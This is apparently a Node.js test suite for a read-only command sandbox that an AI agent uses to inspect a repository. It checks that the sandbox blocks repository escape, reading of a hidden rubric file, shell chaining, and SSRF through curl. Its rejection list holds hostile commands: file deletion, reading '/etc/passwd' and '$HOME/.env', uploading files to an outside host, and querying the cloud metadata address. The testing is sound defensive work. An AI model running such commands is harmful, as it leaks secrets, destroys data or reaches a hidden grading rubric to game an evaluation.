import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync, symlinkSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { EventEmitter } from 'node:events';
import { inspectCommand, repositoryPath, splitCommand, isPublicAddress, parseCurl, fetchPublic } from '../backend/resources/planning-inspection.mjs';

function fixture(t) {
  const root = mkdtempSync(join(tmpdir(), 'planning-inspection-'));
  t.after(() => rmSync(root, { recursive: true, force: true }));
  const repo = join(root, 'repository'); mkdirSync(repo);
  mkdirSync(join(repo, 'src')); mkdirSync(join(repo, '.git'));
  writeFileSync(join(repo, 'src', 'a.ts'), 'alpha\nbeta\nALPHA\n');
  writeFileSync(join(repo, 'space name.txt'), 'space\n');
  writeFileSync(join(root, 'rubric.json'), 'HIDDEN_RUBRIC');
  symlinkSync(root, join(repo, 'outside'));
  symlinkSync(join(root, 'rubric.json'), join(repo, 'src', 'leak.txt'));
  return { root, repo };
}
test('read-only command surface discovers, searches and reads without following symlinks', async t => {
  const { repo } = fixture(t);
  assert.equal(await inspectCommand(repo, 'pwd'), '.');
  assert.match(await inspectCommand(repo, 'ls -la src'), /a.ts/);
  assert.equal(await inspectCommand(repo, 'find . -name "*.ts" -type f'), 'src/a.ts');
  assert.equal(await inspectCommand(repo, 'rg --files src'), 'src/a.ts');
  assert.match(await inspectCommand(repo, 'grep -ni "alpha" src'), /src\/a.ts:3:ALPHA/);
  assert.equal(await inspectCommand(repo, 'cat "space name.txt"'), 'space\n');
  assert.equal(await inspectCommand(repo, 'head -n 1 src/a.ts'), 'alpha');
  assert.equal(await inspectCommand(repo, 'tail -n 1 src/a.ts'), 'ALPHA');
  for (const count of ['-1', '-n1']) {
    assert.equal(await inspectCommand(repo, `head ${count} src/a.ts`), 'alpha');
    assert.equal(await inspectCommand(repo, `tail ${count} src/a.ts`), 'ALPHA');
  }
  for (const command of ['head -2001 src/a.ts', 'tail -n2001 src/a.ts', 'head -1 src/leak.txt', 'head -1 ../rubric.json']) {
    await assert.rejects(inspectCommand(repo, command));
  }
  assert.equal(await inspectCommand(repo, 'grep HIDDEN_RUBRIC .'), '');
  assert.deepEqual(splitCommand('grep "alpha|beta" src'), ['grep', 'alpha|beta', 'src']);
});
test('search filters, deduplicates, limits output and supports cancellation', async t => {
  const { repo } = fixture(t);
  writeFileSync(join(repo, 'src', 'a.test.ts'), 'alpha\n');
  writeFileSync(join(repo, 'src', 'notes.txt'), 'alpha\n');
  assert.equal(await inspectCommand(repo, 'rg -l -g "*.ts" -g "!*.test.ts" alpha src .'), 'src/a.ts');
  assert.equal(await inspectCommand(repo, 'rg -l --glob "src/*.txt" alpha .'), 'src/notes.txt');
  assert.equal(await inspectCommand(repo, 'rg -F missing src'), '');
  assert.equal(await inspectCommand(repo, 'rg -l -g "*.txt" -g "*.test.ts" alpha src'), 'src/a.test.ts\nsrc/notes.txt');
  await assert.rejects(inspectCommand(repo, 'rg -g'), /requires a file glob/);
  writeFileSync(join(repo, 'large.txt'), 'alpha\n'.repeat(20000));
  const output = await inspectCommand(repo, 'rg alpha large.txt');
  assert.match(output, /truncated; narrow the query/);
  assert.ok(Buffer.byteLength(output) < 65600);
  const controller = new AbortController();
  const pending = inspectCommand(repo, 'rg alpha large.txt', controller.signal);
  controller.abort(new Error('cancel inspection'));
  await assert.rejects(pending, /cancel inspection/);
  await assert.rejects(inspectCommand(repo, 'ls', controller.signal), /cancel inspection/);
});
test('rejects shell execution, unsafe flags, writes, repository escape and metadata access', async t => {
  const { repo, root } = fixture(t);
  const commands = [
    'touch changed', 'rm -rf src', 'node -e "1"', 'python3 -c "1"', 'npm test', 'bash -c ls',
    'ls && cat ../rubric.json', 'ls; cat ../rubric.json', 'cat src/a.ts > changed', 'cat src/a.ts | head',
    'cat $(pwd)', 'cat `pwd`', 'cat $HOME/.env', 'ls\ncat ../rubric.json',
    'find . -exec touch changed', 'find . -delete', 'find -L .', 'grep -f ../rubric.json src',
    'rg --pre node alpha .', 'cat ../rubric.json', `cat ${root}/rubric.json`,
    'cat outside/rubric.json', 'cat src/leak.txt', 'find ../', 'ls .git', 'cat /etc/passwd',
    'curl file:///etc/passwd', 'curl -o changed https://example.com', 'curl -d @src/a.ts https://example.com',
    'curl -K ../rubric.json', 'curl --upload-file src/a.ts https://example.com',
    'curl -H "Authorization: secret" https://example.com', 'curl -X POST https://example.com',
    'curl http://127.0.0.1', 'curl http://[::1]', 'curl http://2130706433', 'curl http://localhost',
    'curl http://169.254.169.254', 'curl https://user:pass@example.com', 'curl https://example.com:8080',
  ];
  for (const command of commands) await assert.rejects(inspectCommand(repo, command), undefined, command);
  assert.equal(existsSync(join(repo, 'changed')), false);
  assert.equal(readFileSync(join(repo, 'src/a.ts'), 'utf8'), 'alpha\nbeta\nALPHA\n');
  assert.throws(() => repositoryPath(repo, 'src/leak.txt', true));
});
test('HTTP policy admits public GET/HEAD only, pins DNS and validates redirects', async () => {
  for (const address of ['127.0.0.1', '10.1.2.3', '172.16.0.1', '192.168.0.1', '100.64.0.1', '198.18.0.1', '169.254.169.254', '::1', '::ffff:8.8.8.8', 'fc00::1', 'fe80::1', '2002:0808:0808::1']) assert.equal(isPublicAddress(address), false, address);
  for (const address of ['93.184.216.34', '2606:4700:4700::1111']) assert.equal(isPublicAddress(address), true, address);
  const args = parseCurl(['-fsSIL', 'https://example.com/docs']);
  assert.equal(args.method, 'HEAD'); assert.equal(args.follow, true);
  let requests = 0, dns = 0, redirect = false;
  const network = {
    async lookup() { dns++; return [{ address: '93.184.216.34', family: 4 }]; },
    request(url, options, callback) {
      requests++;
      assert.equal(url.hostname, 'example.com'); assert.equal(options.method, 'HEAD');
      options.lookup('example.com', { all: true }, (error, result) => {
        assert.equal(error, null); assert.deepEqual(result, [{ address: '93.184.216.34', family: 4 }]);
      });
      const request = new EventEmitter();
      request.end = () => queueMicrotask(() => {
        const response = new EventEmitter(); response.statusCode = redirect ? 302 : 200;
        response.headers = redirect ? { location: 'http://127.0.0.1/rubric.json' } : {};
        callback(response); response.emit('end');
      });
      return request;
    },
  };
  assert.match(await fetchPublic(args, undefined, 4, network), /HTTP 200/);
  assert.equal(dns, 1);
  redirect = true;
  await assert.rejects(fetchPublic(args, undefined, 4, network), /local\/private/);
  assert.equal(requests, 2); // The redirected loopback request was never sent.
  await assert.rejects(fetchPublic(args, undefined, 4, { ...network, lookup: async () => [{ address: '10.0.0.1', family: 4 }] }), /local\/private/);
  assert.equal(requests, 2);
});
test('HTTP transport enforces response size, HTTP errors and DNS cancellation', async () => {
  const args = parseCurl(['-f', 'https://example.com']);
  let large = false;
  const network = {
    lookup: async () => [{ address: '93.184.216.34', family: 4 }],
    request(_url, _options, callback) {
      const request = new EventEmitter();
      request.destroy = error => request.emit('error', error);
      request.end = () => queueMicrotask(() => {
        const response = new EventEmitter(); response.statusCode = large ? 200 : 404; response.headers = {};
        callback(response);
        if (large) response.emit('data', Buffer.alloc(65537));
        response.emit('end');
      });
      return request;
    },
  };
  await assert.rejects(fetchPublic(args, undefined, 4, network), /HTTP 404/);
  large = true;
  await assert.rejects(fetchPublic(args, undefined, 4, network), /exceeds 64 KiB/);
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(new Error('DNS deadline')), 10);
  try {
    await assert.rejects(fetchPublic(args, controller.signal, 4, { ...network, lookup: () => new Promise(() => {}) }), /DNS deadline/);
  } finally { clearTimeout(timer); }
});
